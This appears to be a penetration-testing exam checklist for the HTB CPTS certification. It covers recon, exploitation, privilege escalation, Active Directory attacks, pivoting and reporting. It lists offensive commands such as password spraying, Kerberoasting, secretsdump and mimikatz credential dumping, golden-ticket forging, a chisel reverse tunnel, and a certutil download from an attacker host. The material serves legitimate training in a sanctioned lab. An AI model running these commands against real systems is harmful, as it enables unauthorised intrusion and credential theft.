# CPTS Exam Checklist

> **Exam day checklist** for the CPTS exam. Follow this step-by-step to ensure nothing is missed. Duration: 10-day lab access + 3-day reporting window.

---

## Pre-Exam Preparation (Before Day 1)

- [ ] **Environment Setup**
  - [ ] VM prepared and snapshot taken (Kali Linux recommended)
  - [ ] VPN configuration file downloaded
  - [ ] Note-taking solution ready (Obsidian, CherryTree, or similar)
  - [ ] Screenshot tool configured (Flameshot, Greenshot, or similar)
  - [ ] All tools updated: `sudo apt update && sudo apt full-upgrade -y`
  - [ ] Wordlists downloaded: Seclists, rockyou
  - [ ] Python dependencies installed (impacket, bloodhound-python, etc.)
  - [ ] Go tools compiled (ffuf, chisel, etc.)

- [ ] **Tool Arsenal Verified**
  - [ ] Nmap works
  - [ ] Metasploit loads properly: `msfconsole -q`
  - [ ] Burp Suite / Caido configured with CA cert
  - [ ] CrackMapExec / NetExec works
  - [ ] BloodHound installed and neo4j running
  - [ ] Responder configured
  - [ ] Chisel compiled for Linux and Windows
  - [ ] Ligolo-ng proxy and agent compiled
  - [ ] Python HTTP server test: `python3 -m http.server 8080`

- [ ] **Reporting Templates Ready**
  - [ ] Report template created in Obsidian
  - [ ] CVSS calculator bookmarked
  - [ ] Sample screenshots organized

---

## Exam Day 1 -- Initial Access

### Phase 1: VPN Connection
- [ ] Start VPN: `sudo openvpn cpts.ovpn`
- [ ] Verify connection: `ifconfig tun0` (should have an IP)
- [ ] Ping gateway/admin IP to confirm connectivity
- [ ] Notes: VPN IP assigned: _______________
- [ ] Notes: Exam range IPs: _______________

### Phase 2: Initial Reconnaissance (All Targets)
- [ ] **Host Discovery**
  - [ ] `nmap -sn <exam_range>` -- find all live hosts
  - [ ] `masscan <exam_range> -p22,80,443,445,3389,5985,8080,8443 --rate=1000` -- quick port sweep
  - [ ] Record all IPs discovered: _______________

- [ ] **Quick Service Scan (All Hosts)**
  - [ ] `nmap -sV -sC --top-ports 1000 -Pn -oA quick_scan <host>` for each host
  - [ ] Record OS, hostname, and domain info for each host
  - [ ] Identify domain controller(s)
  - [ ] Identify web servers
  - [ ] Check for SMB, LDAP, DNS, WinRM, RDP

### Phase 3: Full Port Scan (Interesting Hosts)
- [ ] `nmap -p- --min-rate=1000 -T4 -Pn -oA full_tcp <host>` -- for each host with open ports
- [ ] `nmap -sU --top-ports 20 -Pn -oA quick_udp <host>` -- for each host
- [ ] Re-scan with service detection on ALL open ports: `nmap -p <all_ports> -sC -sV -Pn -oA detailed <host>`
- [ ] Save all Nmap output (nmap, gnmap, xml formats)

### Phase 4: Service Deep Enumeration
- [ ] **Web Services (80, 443, 8080, 8443, etc.)**
  - [ ] Browse each web application manually
  - [ ] `whatweb <url>` -- technology fingerprinting
  - [ ] `curl -I <url>` -- headers, cookies, server info
  - [ ] `nikto -h <url>` -- vulnerability scan
  - [ ] `ffuf -u <url>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt` -- directory busting
  - [ ] `ffuf -u <url> -H "Host: FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt` -- vhost discovery
  - [ ] Check for parameter injection (LFI, SQLi, SSTI, etc.)
  - [ ] Review JavaScript files for endpoints and secrets
  - [ ] Check /robots.txt, /sitemap.xml
  - [ ] Login page? Try default creds, test for SQLi, weak password policy

- [ ] **SMB (139, 445)**
  - [ ] `smbclient -L //<host> -N` -- list shares (null session)
  - [ ] `smbmap -H <host>` -- share enumeration
  - [ ] `crackmapexec smb <host> -u '' -p '' --shares` -- anonymous/guest access
  - [ ] `enum4linux -a <host>` -- full enumeration
  - [ ] `rpcclient -U "" -N <host>` -- RPC enum (users, groups, info)
  - [ ] `nmap -p 445 --script smb-vuln* -Pn <host>` -- vulnerability checks
  - [ ] Check for SMB signing: `nmap -p 445 --script smb-security-mode <host>`
  - [ ] Connect to writable shares, download readable files
  - [ ] Check for MS17-010 (EternalBlue)

- [ ] **LDAP (389, 636, 3268)**
  - [ ] `ldapsearch -H ldap://<host> -x -b "dc=<domain>,dc=<local>" -s base` -- naming context
  - [ ] `ldapsearch -H ldap://<host> -x -b "dc=<domain>,dc=<local>"` -- dump everything
  - [ ] `bloodhound-python -d <domain> -u '' -p '' -ns <host> -c All` -- BloodHound collection
  - [ ] Look for descriptions with passwords, SPNs, interesting ACLs

- [ ] **DNS (53)**
  - [ ] `dig axfr @<host> <domain>` -- zone transfer
  - [ ] `dnsrecon -d <domain> -t axfr -n <host>` -- DNS recon
  - [ ] Subdomain brute force if domain identified

- [ ] **Other Services**
  - [ ] SNMP (161): `snmpwalk -v2c -c public <host>`, `snmp-check <host>`
  - [ ] NFS (2049): `showmount -e <host>`, mount if possible
  - [ ] MySQL (3306): try default root:root/root:"" / sa:sa
  - [ ] MSSQL (1433): `mssqlclient.py`, `sqsh`
  - [ ] PostgreSQL (5432): try postgres:postgres
  - [ ] Redis (6379): `redis-cli -h <host> info`
  - [ ] WinRM (5985/5986): `crackmapexec winrm <host> -u users.txt -p passwords.txt`
  - [ ] RDP (3389): `xfreerdp /v:<host>`, `crowbar` brute force
  - [ ] Docker (2375): `docker -H tcp://<host>:2375 ps`

### Phase 5: Vulnerability Assessment
- [ ] **Web Vulnerability Scan**
  - [ ] `nuclei -u <url> -t /root/nuclei-templates/`
  - [ ] Manual parameter testing (SQLi, XSS, LFI, SSTI, SSRF)
  - [ ] Check for file upload functionality
  - [ ] API endpoints? Test for IDOR, auth bypass

- [ ] **CVE / Version Check**
  - [ ] `searchsploit <service> <version>` for each discovered service
  - [ ] Cross-reference OS versions with known exploits
  - [ ] Check kernel versions for privilege escalation exploits

- [ ] **Password Attacks**
  - [ ] `kerbrute userenum -d <domain> --dc <host> users.txt` -- enumerate AD users
  - [ ] `GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <host>` -- AS-REP roasting
  - [ ] `GetUserSPNs.py <domain>/<user>:'<pass>' -dc-ip <host> -request` -- Kerberoasting
  - [ ] Password spraying with discovered usernames: `crackmapexec smb <host> -u users.txt -p 'Password123'`
  - [ ] Brute force any accessible services (SSH, RDP, web forms)

---

## Exam Day 2-3 -- Exploitation & Lateral Movement

### Phase 6: Exploitation -- Gain Initial Foothold
- [ ] **Execute Exploits**
  - [ ] Public exploit (searchsploit/exploit-db)
  - [ ] Metasploit module
  - [ ] Manual exploitation (SQLi -> shell, LFI -> RCE, File Upload -> shell)
  - [ ] Password attack successful -> valid credentials
  - [ ] Default credentials -> access

- [ ] **Post-Foothold Enumeration**
  - [ ] `whoami` / `id` -- identity
  - [ ] `ip a` / `ipconfig` -- network configuration, other segments
  - [ ] Network connections: `netstat -an` / `ss -tlnp`
  - [ ] Domain info: `net group "Domain Admins" /domain` (Windows)
  - [ ] `/etc/hosts`, `C:\Windows\System32\drivers\etc\hosts`
  - [ ] DNS config: `/etc/resolv.conf`, `ipconfig /all`
  - [ ] Check for other hosts in the same network segment

### Phase 7: Privilege Escalation
- [ ] **Linux PrivEsc** (if applicable)
  - [ ] `./linpeas.sh` -- automated enumeration
  - [ ] `sudo -l` -- sudo privileges
  - [ ] `find / -perm -4000 2>/dev/null` -- SUID binaries
  - [ ] `cat /etc/crontab` / `pspy64` -- cron jobs
  - [ ] `getcap -r / 2>/dev/null` -- capabilities
  - [ ] `uname -a` -- kernel exploits
  - [ ] `find / -writable -type f 2>/dev/null | grep -v proc` -- writable files
  - [ ] Check for password reuse from earlier enumeration

- [ ] **Windows PrivEsc** (if applicable)
  - [ ] `winpeas.exe` -- automated enumeration
  - [ ] `whoami /priv` -- token privileges
  - [ ] `systeminfo` -- OS version, patches
  - [ ] `wmic service list brief` / `sc query` -- services
  - [ ] Registry checks (AlwaysInstallElevated, AutoRun)
  - [ ] Unquoted service paths
  - [ ] `.\PowerUp.ps1; Invoke-AllChecks`
  - [ ] `findstr /si password *.txt *.config *.xml *.ini`

- [ ] **Dump Credentials**
  - [ ] Linux: `/etc/shadow`, history files, SSH keys, config files
  - [ ] Windows: SAM, LSASS, NTDS.dit
  - [ ] `mimikatz.exe`
  - [ ] `impacket-secretsdump -hashes <LM>:<NT> <domain>/<user>@<target>`

### Phase 8: Active Directory Enumeration & Attacks
- [ ] **BloodHound Analysis**
  - [ ] Run BloodHound data collection on each AD host: `bloodhound-python -d <domain> -u <user> -p '<pass>' -ns <dc> -c All`
  - [ ] Upload to BloodHound GUI
  - [ ] Find shortest paths to Domain Admins
  - [ ] Find Kerberoastable users
  - [ ] Find AS-REP roastable users
  - [ ] Check for constrained/unconstrained delegation
  - [ ] Check ACL abuse paths

- [ ] **Active Directory Attacks**
  - [ ] Kerberoasting: `GetUserSPNs.py`
  - [ ] AS-REP Roasting: `GetNPUsers.py`
  - [ ] DCSync (if DA privileges): `secretsdump.py`
  - [ ] Pass the Hash: `wmiexec.py -hashes`
  - [ ] Overpass the Hash
  - [ ] SMB Relay (if SMB signing disabled)
  - [ ] AD CS enumeration: `certipy find`
  - [ ] Silver/Golden ticket attacks
  - [ ] Kerberos delegation abuse

### Phase 9: Lateral Movement & Pivoting
- [ ] **Network Pivot Setup**
  - [ ] Identify hosts only accessible from compromised machine(s)
  - [ ] Set up SOCKS proxy: Chisel, Ligolo-ng, or SSH tunneling
  - [ ] Configure proxychains: `cat /etc/proxychains4.conf`
  - [ ] Route traffic through pivot to reach new subnets
  - [ ] `proxychains nmap -sT -Pn -p 445,3389,5985 <new_subnet>` -- scan through pivot

- [ ] **Lateral Movement**
  - [ ] Pass the Hash to other hosts
  - [ ] CrackMapExec: spray credentials across subnet
  - [ ] WMI/WinRM execution with creds: `crackmapexec winrm <subnet> -u <user> -H <hash> -x whoami`
  - [ ] PsExec to remote hosts
  - [ ] SSH key reuse
  - [ ] Repeat priv esc on each new compromised host

### Phase 10: Full Domain Compromise
- [ ] Capture DA hash: `impacket-secretsdump -just-dc <domain>/<user>:'<pass>'@<dc>`
- [ ] Dump all domain hashes
- [ ] Dump NTDS.dit
- [ ] Golden Ticket: `impacket-ticketer -nthash <krbtgt-hash> -domain-sid <SID> -domain <domain> Administrator`
- [ ] Verify DA access across the domain

---

## Phase 11: Evidence Collection

- [ ] **Organized Evidence Structure**
  ```
  evidence/
  +-- scans/
  |   +-- nmap/         (all nmap output)
  |   +-- web/          (whatweb, nikto, screenshots)
  +-- exploits/
  |   +-- <vuln-name>/  (commands, output, screenshots per vuln)
  +-- credentials/
  |   +-- hashes.txt
  |   +-- passwords.txt
  |   +-- users.txt
  +-- screenshots/
  |   +-- initial-access/
  |   +-- privilege-escalation/
  |   +-- lateral-movement/
  |   +-- domain-admin/
  +-- report/
  ```

- [ ] **Screenshot Requirements** (each should show:)
  - [ ] Command executed
  - [ ] Output proving the finding
  - [ ] System time / context

- [ ] **Key Evidence to Capture**
  - [ ] Initial access method (exploit + shell)
  - [ ] Privilege escalation on each host
  - [ ] Credential access (hash dumps, cleartext passwords)
  - [ ] Lateral movement commands
  - [ ] Domain admin access
  - [ ] Any sensitive data found
  - [ ] All configuration files with passwords/connections
  - [ ] Network diagram (hand-drawn or generated)

---

## Exam Day 8-10 -- Final Days & Reporting

### Phase 12: Verify Everything
- [ ] Revisit any hosts with incomplete exploitation
- [ ] Double-check network for missed subnets
- [ ] Ensure all paths to DA are documented
- [ ] Verify all screenshots are saved and timestamped
- [ ] Take notes on failed attempts too (shows methodology)

### Phase 13: Report Writing
- [ ] **Structure Complete**
  - [ ] Executive Summary
  - [ ] Methodology section
  - [ ] Findings (one per vulnerability)
  - [ ] Appendices with full scan results
  - [ ] Network diagram

- [ ] **Each Finding Contains:**
  - [ ] Title
  - [ ] Severity + CVSS 3.1 score
  - [ ] CVSS vector string
  - [ ] Asset (IP/hostname)
  - [ ] Description
  - [ ] Proof of Concept (step-by-step with screenshots and commands)
  - [ ] Impact analysis
  - [ ] Remediation recommendations
  - [ ] References

- [ ] **Report Quality Checks**
  - [ ] Spelling and grammar checked
  - [ ] Screenshots embedded with proper resolution
  - [ ] No proprietary/sensitive info leaked in report
  - [ ] Technical accuracy verified
  - [ ] Executive summary understandable by non-technical audience
  - [ ] PDF generated and tested
  - [ ] File size within limits

### Phase 14: Submission
- [ ] **Final Check**
  - [ ] Report exported to PDF
  - [ ] All evidence files organized and included
  - [ ] No test data or placeholder content
  - [ ] Report file named correctly per exam instructions

- [ ] **Submit**
  - [ ] Upload report to HTB exam portal
  - [ ] Confirm upload successful
  - [ ] Save submission confirmation
  - [ ] Close VPN connection

---

## Exam Day Quick Reference

```bash
# Essential commands to have at your fingertips

# Host discovery
nmap -sn <subnet>/24

# Full port scan
nmap -p- --min-rate=1000 -T4 -Pn -oA full_tcp <host>

# Service enumeration
nmap -p <ports> -sC -sV -Pn -oA services <host>

# Web recon
ffuf -u http://<host>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
ffuf -u http://<host> -H "Host: FUZZ.<domain>" -w subdomains.txt

# SMB
crackmapexec smb <host> -u users.txt -p passwords.txt
smbmap -H <host>
enum4linux -a <host>

# LDAP
ldapsearch -H ldap://<host> -x -b "dc=<domain>,dc=<local>"

# AD attacks
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <dc>
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <dc> -request
impacket-secretsdump <domain>/<user>:'<pass>'@<target>

# Pivoting
chisel server -p 8080 --reverse
chisel client <attacker>:8080 R:socks
proxychains nmap -sT -Pn <target>

# File transfer
python3 -m http.server 8080
certutil -urlcache -f http://<attacker>/file file.exe
```

### Notes Section

| Item | Value |
|------|-------|
| Exam Range | |
| Domain | |
| DC IP | |
| DA User | |
| VPN IP | |
| Attack IP | |
| Users Found | |
| Hashes Captured | |
| Hosts Compromised | |
| Report Due Date | |

---

## Things NOT to Do

- [ ] DON'T run noisy scans all day -- one thorough scan is enough
- [ ] DON'T forget to start a listener before triggering a reverse shell
- [ ] DON'T ignore services that aren't on standard ports
- [ ] DON'T skip UDP scanning entirely
- [ ] DON'T forget to check for outbound firewall rules
- [ ] DON'T submit incomplete evidence (screenshots without commands)
- [ ] DON'T forget to include failed attempts in notes (shows scope of testing)
- [ ] DON'T neglect the report -- it's 50% of your grade
- [ ] DON'T wait until the last day to start the report
- [ ] DON'T forget to back up your notes daily

---

*See also: [[00 - Methodology and Workflow/CPTS Methodology]], [[00 - Methodology and Workflow/Quick Reference Card]], [[14 - Common Ports and Services/Port Reference]]*
